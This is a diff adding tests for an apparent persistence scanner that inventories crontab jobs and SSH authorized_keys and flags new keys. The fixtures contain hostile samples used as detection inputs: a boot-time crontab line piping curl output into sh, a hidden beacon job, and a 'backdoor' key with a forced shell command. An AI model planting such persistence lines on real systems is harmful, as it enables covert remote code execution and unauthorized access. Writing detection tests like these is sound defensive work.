@@ -110,3 +110,90 @@ def test_unreadable_location_makes_the_scan_record_an_error(tmp_path: Path, monk
     assert run.run_id == result.run_id
     assert run.errors_count == 1
     assert run.status in ("partial", "failed")    # a locked directory is never a clean pass
+
+
+# ---------- crontab and authorized_keys (J-0638) ----------
+
+from secure.persistence._shell import ShellResult
+
+
+def test_crontab_job_lines_become_entries_and_env_and_comments_do_not(monkeypatch):
+    calls = []
+
+    def fake_run(args, timeout=5.0):
+        calls.append(args)
+        return ShellResult(True, "SHELL=/bin/sh\n# nightly\n*/5 * * * * /Users/x/.hidden/beacon --quiet\n@reboot curl -s example | sh\n\n", "", 0)
+
+    monkeypatch.setattr(extra, "run", fake_run)
+    monkeypatch.setattr(extra, "_EXTRA_LOCATIONS", {"cron_job": ("crontab", [Path("/usr/bin/crontab")])})
+    entries, unavailable = extra.scan_extra_locations()
+    assert calls == [["/usr/bin/crontab", "-l"]]
+    assert unavailable == []
+    assert [(e["kind"], e["label"], e["program_path"]) for e in entries] == [
+        ("cron_job", "*/5 * * * * /Users/x/.hidden/beacon --quiet", "/Users/x/.hidden/beacon"),
+        ("cron_job", "@reboot curl -s example | sh", None),
+    ]
+    assert len({e["path"] for e in entries}) == 2
+
+
+def test_no_crontab_is_empty_but_a_failed_crontab_is_unavailable(monkeypatch):
+    monkeypatch.setattr(extra, "_EXTRA_LOCATIONS", {"cron_job": ("crontab", [Path("/usr/bin/crontab")])})
+    monkeypatch.setattr(extra, "run", lambda args, timeout=5.0: ShellResult(False, "", "crontab: no crontab for x\n", 1))
+    assert extra.scan_extra_locations() == ([], [])
+    monkeypatch.setattr(extra, "run", lambda args, timeout=5.0: ShellResult(False, "", "command timed out", None))
+    entries, unavailable = extra.scan_extra_locations()
+    assert entries == [] and len(unavailable) == 1 and "timed out" in unavailable[0]
+
+
+def test_authorized_keys_are_listed_by_fingerprint_with_forced_commands_marked(tmp_path: Path, monkeypatch):
+    import base64
+    import hashlib
+
+    blob = b"\x00\x00\x00\x0bssh-ed25519" + bytes(range(32))
+    b64 = base64.b64encode(blob).decode()
+    keys = tmp_path / "authorized_keys"
+    keys.write_text(
+        f"# comment\nssh-ed25519 {b64} laptop\n"
+        f'command="/bin/sh -c \\"id\\"",no-pty ssh-ed25519 {b64} backdoor\n'
+        "garbage that is not a key\n"
+    )
+    monkeypatch.setattr(extra, "_EXTRA_LOCATIONS", {"ssh_authorized_key": ("authorized_keys", [keys, tmp_path / "authorized_keys2"])})
+    entries, unavailable = extra.scan_extra_locations()
+    fingerprint = "SHA256:" + base64.b64encode(hashlib.sha256(blob).digest()).decode().rstrip("=")
+    assert unavailable == []
+    assert [(e["path"], e["label"]) for e in entries[:2]] == [
+        (f"{keys}#{fingerprint}", "ssh-ed25519 laptop"),
+        (f"{keys}#{fingerprint}", "ssh-ed25519 backdoor [forced command]"),
+    ]
+    assert entries[2]["label"] == "unparseable line 4" and "#unparsed:" in entries[2]["path"]
+    assert all(e["program_path"] is None for e in entries)
+
+
+def test_unreadable_authorized_keys_is_unavailable_not_empty(tmp_path: Path, monkeypatch):
+    keys = tmp_path / "authorized_keys"
+    keys.write_text("x")
+    real = Path.read_text
+
+    def read_text(self, *a, **k):
+        if self == keys:
+            raise PermissionError(13, "Operation not permitted")
+        return real(self, *a, **k)
+
+    monkeypatch.setattr(Path, "read_text", read_text)
+    monkeypatch.setattr(extra, "_EXTRA_LOCATIONS", {"ssh_authorized_key": ("authorized_keys", [keys])})
+    entries, unavailable = extra.scan_extra_locations()
+    assert entries == [] and len(unavailable) == 1 and "PermissionError" in unavailable[0]
+
+
+def test_new_authorized_key_raises_a_high_persistence_alert(tmp_path: Path, monkeypatch):
+    import base64
+
+    keys = tmp_path / "authorized_keys"
+    keys.write_text("ssh-ed25519 " + base64.b64encode(b"k" * 51).decode() + " intruder\n")
+    _isolate(monkeypatch, tmp_path, {"ssh_authorized_key": ("authorized_keys", [keys])})
+    monkeypatch.setattr(scanner_module, "check_code_signing", lambda p: "unsigned")
+    with Database(tmp_path / "test.db") as db:
+        first = scanner_module.scan_persistence(db.conn)
+        alerts = list_persistence_alerts(db.conn)
+    assert [(a.kind, a.severity) for a in first.alerts] == [("new_persistence_entry", "high")]
+    assert len(alerts) == 1 and alerts[0].target_type == "ssh_authorized_key"
